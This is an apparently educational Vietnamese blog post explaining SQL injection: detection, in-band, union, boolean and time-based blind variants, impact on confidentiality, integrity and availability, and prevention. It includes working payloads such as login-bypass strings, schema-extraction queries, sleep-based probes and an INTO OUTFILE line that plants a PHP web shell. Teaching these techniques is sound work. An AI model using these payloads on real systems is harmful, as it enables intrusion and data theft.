---
title: "SQL Injection"
date: 2024-12-10
draft: false
tags: ["web", "vuln", "pentest"]
categories: ["web Vulnerability"]
lightgallery: true
toc:
  enable: true
description: "SQL Injection"
---
# Phân tích về lỗ hổng SQL Injection - SQLi: 
  SQLi là một loại lỗ hổng thuộc loại **Technical vulnerability**. Trong bài này thì mình sẽ nói về: SQL là gì? -> Khái niệm SQL Injection -> Phát hiện SQL Injection như thế nào? –> Các dạng SQL Injection hay gặp -> Cách khai thác SQL Injection như thế nào? -> Mức độ ảnh hưởng của SQL Injection đến tam giác CIA -> Các trường hợp đặc biệt của SQL Injection -> Cách phòng chống SQL Injection và cách xử lý khi bị tấn công SQL Injection <br>
## 1. SQL là gì?
- SQL - Structured Query Language: là một ngôn ngữ truy vấn có cấu trúc thường được dùng để thao tác, làm việc với cơ sở dữ liệu. Ví dụ như việc lấy ra thông tin người dùng đang được lưu trong database, thêm một người dùng mới, sửa thông tin khách hàng hay xoá một người dùng ra khỏi database
- Mỗi kiểu database sẽ có những cấu trúc của các lệnh SQL khác nhau nhưng đều mang 1 ý nghĩa chung.
- Một vài ví dụ về lệnh SQL:
  - Lấy ra tất cả người dùng có user_id = 1 trong bảng users bằng lệnh ```SELECT```
   ```sql
   SELECT * FROM users WHERE user_id = '1'
   ```
  - Thêm các giá trị ```admin``` và ```admin``` lần lượt vào các cột ```username``` và ```password``` trong bảng users bằng lệnh ```INSERT INTO```
   ```sql
   INSERT INTO users(username, password) VALUES('admin', 'admin')
   ```
  - Thay đổi ```password``` của ```username = admin``` thành ```admin123``` bằng lệnh ```UPDATE```
   ```sql
   UPDATE users SET password = 'admin123' WHERE username = 'admin'
   ```
  - Xoá người dùng có ```username = admin``` bằng lệnh ```DELETE```
   ```sql
   DELETE FROM users WHERE username = 'admin'
   ```

## 2. Khái niệm về SQL Injection - SQL Injection là gì?
- SQLi là một kỹ thuật tấn công cho phép kẻ tấn công chèn(Inject) những lệnh SQL độc hại vào những nơi có thể nhập dữ liệu của hệ thống để từ có thể khai thác được các thông tin từ database. Cũng có thể nói là SQLi là tấn công vào database thông qua các giá trị input của ứng dụng.
- Ý tưởng cốt lõi là lợi dụng việc kiểm tra đầu vào của người dùng không kỹ để có thể đánh lừa được ứng dụng Web và qua mặt các hàng bảo vệ của hệ thống bằng việc tạo ra những mã SQL bất thường và biến nó thành bình thường để sever có thể chạy được sau đó lấy ra được những thông tin nhạy cảm(Email, SĐT,...).
- SQLi sảy ra chủ yếu là do người lập trình viên không validate dữ liệu đầu vào, để người dùng có thể nhập dữ liệu tuỳ ý.
## 3. Phát hiện SQLi như thế nào?
- Có nhiều cách, dấu hiệu để có thể kết luận là một chức năng hay một trang web bị dính SQLi. Ở các function liên quan đến truy vấn và database có thể test bằng những cách như sau: 
  - Thêm ký tự ```‘``` vào username, password, id, userid,… nếu lỗi không mong muốn sảy ra -> Lỗi SQLi
  - Thêm chuỗi
    ```sql
    ‘OR 1=1 LIMIT 1, 1-- -
    ```
    vào sau password và username có trong hệ thống nếu có thể truy cập được tài khoản một ai đó -> Lỗi SQLi
  - Dùng tính năng scan lỗ hổng SQLi trong Burpsuite
  - Dùng tools: [sqlmap](https://github.com/sqlmapproject/sqlmap),…
  - Và còn rất nhiều cách để phát hiện SQLi – Tham khảo: https://book.hacktricks.xyz/pentesting-web/sql-injection
## 4. Các dạng SQLi hay gặp
-	Dạng đầu tiên của SQLi là In-band SQLi – Classic SQLi: Đây là 1 kiểu tấn công mà khi chèn SQL kẻ tấn công có thể thấy được và nhận được kết quả trực tiếp ngay trên chính giao diện trang web đó. Ví dụ như bạn tấn công vào form đăng nhập thì kết quả là bạn sẽ thấy và vào được tài khoản người dùng.
-	Một dạng khác là Blind SQLi: Dạng này là dạng mà khi chèn SQL thì sever chỉ phản hồi về cho kẻ tấn công 2 trạng thái khác nhau từ đó hacker có thể dựa vào nó để đoán tên database, table, column hay thậm chí là cả data trong hệ thống.
-	Out-of-band SQLi: Đây là kiểu tấn công mà hacker không nhận được phản hồi trực tiếp từ 1 kênh của ứng dụng mà thông qua kênh khác. Kiểu tấn công này ít phổ biến hơn 2 kiểu trên vì nó còn phụ thuộc vào yếu tố khác
## 5. Cách khai thác với các dạng SQLi hay gặp như thế nào?
  ### In-band(classic) SQLi: 
  - In-band: Kiểu này khá đơn giản vì kẻ tấn công có thể trực tiếp quan sát được kết quả từ đó có thể tư duy, logic để khai thác hiệu quả:
    - ```sql
      ‘OR 1=1 LIMIT 1,1-- -
      ```
    - ```sql
      page.asp?id=1 or 1=1 -- -
      ```
    - Lấy tất cả các bảng trong database hiện tại(My SQL):
      ```sql
      SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE()
      ```
    - ```http://chall.tlualgosec.com:1337/post/1+1``` - sau post chính ra là id của bài post là 1 số nguyên nhưng nhập ```1+1``` vẫn được chấp nhập và trả về bài post có id là ```2```.
  - Error-based: là một dạng khác của In-band SQLi, kiểu tấn công này thì hacker sẽ tận dụng những thông báo lỗi khi chạy lệnh SQL từ phía sever hiển thị ra màn hình từ đó tận dụng khai thác. Cách khai thác lỗi này giống với việc khai thác In-band tuy nhiên hacker cần cố tình tạo ra 1 câu lệnh SQL sai với cú pháp hoặc logic của ngôn ngữ SQL nhằm tạo ra lỗi và hiển thị nó ra màn hình và từ lỗi hiển thị ra đó sẽ có thể chứa thông tin về database,…
    - Ví dụ: khi so sánh<br>
    
       | Bình thường->không lỗi    | Khác thường->lỗi |
       |---------------------------|------------------|
       | int với int                 | Varchar với int    |

    - Trong một ứng dụng web khi yêu cầu nhập id sản phẩm là một số nguyên kiểu int tuy nhiên hacker đã nhập hàm *version()* trong mysql mà hàm này trả vể 1 chuỗi kiểu string là phiên bản hiện tại của database vậy thông báo lỗi có thể là: ```"5.7.44" Cannot compare string to int!``` - 5.7.44 là kết quả của hàm version().
  - Union-based SQLi: Kiểu tấn công này cho phép hacker có thể lấy được gần như toàn bộ data trong database thông qua câu lệnh ```UNION```
    -	Với kiểu tấn công này thì cần biết số lượng cột, kiểu dữ liệu của từng cột hay gọi là tham số và kiểu dữ liệu của tham số của câu lệnh ```SELECT``` trước đó vì lệnh ```UNION``` cần phải khớp về số lượng cột và kiểu dữ liệu thì mới hoạt động được. Có vẻ khó nhưng thật ra thì rất đơn giản vì để đoán được số lượng cột thì có thể viết đoạn code đơn giải rồi chạy vòng for từ 1 đến khi nào tìm được đúng số cột còn về kiểu dữ liệu thì nếu là thông tin người dùng thì thường chỉ có int, double, varchar, hay nvarchar
    -	Hoặc cách khác để biết số lượng cột là dùng ORDER BY “number” – lệnh sắp xếp trong SQL, đến khi nào nhập 1 ```number``` mà lỗi thì số ```number - 1``` là số lượng cột.
    -	```GROUP BY “number”``` – giống ORDER BY
    -	```SELECT NULL, NULL,…-- -``` hay ```SELECT 1, 2, 3,…-- -```. Chuỗi ```-- -``` comment hết lệnh phía sau và tránh trường hợp validate dấu cách ở cuối vì sau comment phải cách ra 1 cái thì mới hoạt động bình thường
    -	Lấy tất cả các bảng trong database hiện tại(My SQL): 
      ```sql
      ' UNION SELECT table_name, NULL, NULL, ... FROM information_schema.tables--
     ```
  ### Blind-SQLi:
  - Boolean-based SQLi: là kiểu tấn công mà hacker chèn mã SQL vào thì sever sẽ trả về 2 kiểu trạng thái khác nhau ví dụ như: True – False, Found – Not Found, Yes – No,…
    - ```sql
      page.asp?id=1 AND 1=1 -- -“ // True
      ```
    - ```sql
      page.asp?id=1 AND 1=2 -- -“ // FALSE
      ```
    - Lấy ký tự đầu tiên của tên bảng so sánh với ```A``` nếu đúng->True, sai->False
      ```sql
      ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
      ```
    - Với kiểu khai thác này thì chủ yếu là phải viết code chạy để tìm được tên database, tên bảng, cột, data,…Nếu dùng tay thì hơi lâu
    - Thuật toán tìm kiếm nhị phân được áp dụng để khai thác lỗi SQLi này rất nhanh và phổ biến. Bên dưới là mã giả minh hoạ để lấy flag có độ dài là 45 ký tự vào các ký tự có các số tương ứng trong bảng ascii từ 0 đến 200 bằng chặt nhị phân
    ```python
	flag = "" # giả sử flag dài 45 ký tự
    for i in range(1, 45):
		print(i)
		l, r = 0, 200
		while l <= r:
	   		m = (l + r) // 2 # Lấy ra số ở giữa l và r
    		#Chuyển số m thành ký tự tương ứng trong bảng ascii
    		#Nếu đúng là ký tự cần tìm thì break vì đã tìm được ký tự cần tìm;
	   		if "Ký tự cần tìm" == chr(m)
    			break;
    		#Nếu chưa phải là ký tự cần tìm thì so sánh chr(m) với "Ký tự cần tìm"
    			ĐK = "Ký tự cần tìm" > chr(m)
    		#Nếu ĐK đúng thì chỉ cần tìm đoạn từ m + 1 -> 200
	   		if ĐK==True:
	   			l = m + 1
    		#Ngược lại nếu ĐK sai tức là ký tự đó nằm trong đoạn từ 1 -> m - 1
	   		else: r = m - 1
	   	flag += chr(m) # cộng "ký tự cần tìm" vào chuỗi flag
	   	print(flag) # ghi flag
    ```
  - Time-Based SQLi: Cũng tương tự như Boolean-based nhưng hacker sẽ khai thác dựa vào thời gian phản hồi của sever – nếu đúng thì thời gian phải hồi là sẽ lớn hơn hoặc bằng thời gian mà hacker chèn vào, còn nếu sai thì ngược lại
    - Ví dụ: Trong payload này thì nếu ký tự đầu tiên của bảng là ```A``` thì phải hồi sẽ là sau 10s còn nếu ko đúng sẽ < 10s
      ```sql
      1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
      ```
## 6. Ảnh hưởng của lỗ hổng SQLi đến tam giác CIA như thế nào?
  ### Tam giác CIA:
   - Tam Giác CIA là tam giác đại diện cho độ an toàn của một ứng dụng thông qua 3 quy chuẩn sau để đánh giá độ an toàn, bảo mật của hệ thống đến đâu:
     - C – Confidental (Tính bảo mật)✅
     - I – Intergrity (Tính toàn vẹn)✅
     - A – Availability (Tính sẵn sàng)✅
  ### Ảnh hưởng SQLi đến tam giác CIA:
   - Vậy SQLi ảnh hưởng đến tam giác CIA như thế nào. Giả sử một ứng dụng web bị mắc lỗ hổng SQLi thì:
     - Với kiểu tấn công In-band SQLi thì hacker có thể đăng nhập vào tài khoản của người dùng khác, tìm đọc được thông tin nhạy cảm của người dùng -> vi phạm tính bảo mật hệ thống(C)❌
     - Khi có thể chèn được mã SQL độc hại thì có thể thêm, sửa, xoá các dữ liệu trong database qua các câu lệnh như INSERT, UPDATE, DELETE,... -> vi phạm tính toàn vẹn hệ thống(I)❌
     - Tiếp theo nếu dữ liệu trong database bị xoá khi chèn thêm lệnh DELETE thì tính sẵn sàng của hệ thống cũng bị mất -> vi phạm tính sẵn sàng(A)❌<br>
      
	 => Vậy có thể kết luận là lỗ hổng SQLi có thể vi phạm đến tất cả các cạnh của tam giác CIA - SQLi nằm ở vị trí cao trong top 10 OWASP💢
## 7. Trường hợp đặc biệt của lỗ hổng SQLi
- SQLi to Remote code excution(SQLi to RCE):<br>
  Ví dụ: Payload cho phép ghi lệnh system php vào file shell.php vào trong hệ thống
  ```sql
  '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
  ```
  Sau đó truy cập file shell.php vừa up để thực hiện RCE
  ```sql
  http://domain/shell.php?cmd=whoami
  ```
- Out-of-band SQL injection
## 8. Phòng chống SQL Injection như thế nào - Làm gì khi bị SQLi?
- SQL Injection rất nguy hiểm và dễ khai thác vì vậy nên những năm gần đây có vẻ như SQLi có vẻ đã "tuyệt chủng" khi ít còn xuất hiện nhiều như những năm đầu vậy có 1 số cách phòng chống SQLi phổ biến như sau:
  - "Đừng tin người dùng" - Bất cứ ở đâu cho phép người dùng nhập data luôn phải validate cả front-end và back-end
  - Sử dụng thư viện có sẵn, an toàn để tạo các truy vấn SQL đến database
  - Không nên hiển thị lỗi mặc định của hệ thống hay lỗi của database, cần kiểm soát được các trường hợp sinh lỗi để thông báo có chủ đích(Tránh tấn công Error-based SQLi)
  - Luôn mã hoá các thông tin nhạy cảm của người dùng trước khi đưa vào database để nếu bị SQLi thì hacker vẫn không biết được chính xác thông tin
  - Phân quyền rõ ràng trong database - tránh trường hợp hacker vào được tài khoản người dùng lại có quyền admin
  - Luôn backup dữ liệu thường xuyên - nếu bị hacker xoá vẫn có thể khôi phục lại được
  - ...
- Khi bị tấn công SQLi thì nên làm 1 số việc sau:
  - Dừng các dịch dụ đang chạy trên hệ thống
  - Tìm nguyên nhân gây ra SQLi, chức năng nào bị lỗi, vì sao bị lỗi,...
  - Kiểm tra xem kẻ tấn công đã làm được những gì trong hệ thống
  - Khắc phục nhanh chóng, tìm và fix lại chỗ bị lỗi SQLi
  - Sau khi đã chắc chắn là an toàn thì khởi động lại hệ thống
  <br>
=>  "Nên phòng bệnh hơn là chữa bệnh✅"
## 9. Tổng kết
SQL Injection - SQLi thuộc loại **Technical vulnerability** là một lỗ hổng bảo mật nghiêm trọng và nguy hiểm trong các ứng dụng web, app,... Với nhiều biến thể tấn công nó ảnh hưởng trực tiếp đến 3 cạnh của tam giác bảo mật CIA. SQLi có thể bỏ qua xác thực người dùng, xem, thêm, sửa, xoá dữ liệu của database gây ảnh hưởng lớn đến hệ thống. Mặc dù hiện nay không còn phổ biến như trước tuy nhiên nếu không cẩn thận vẫn sẽ mắc phải
# Tài liệu tham khảo:
-	[TAS Blog - Web penetration testing fundamental (1)](https://tlualgosec.com/posts/Blog101/)
-	[Cookie hanhoan](https://cookiearena.org/hoc-pentester/sql-injection-mon-qua-cua-hacker-trong-dem-giang-sinh/)
-	[Toidicodedao](https://toidicodedao.com/2016/11/15/lo-hong-sql-injection-than-thanh/)
-	[Hackstrick](https://book.hacktricks.xyz/pentesting-web/sql-injection)
-	[Invicti.com](https://www.invicti.com/learn/sql-injection-sqli/)
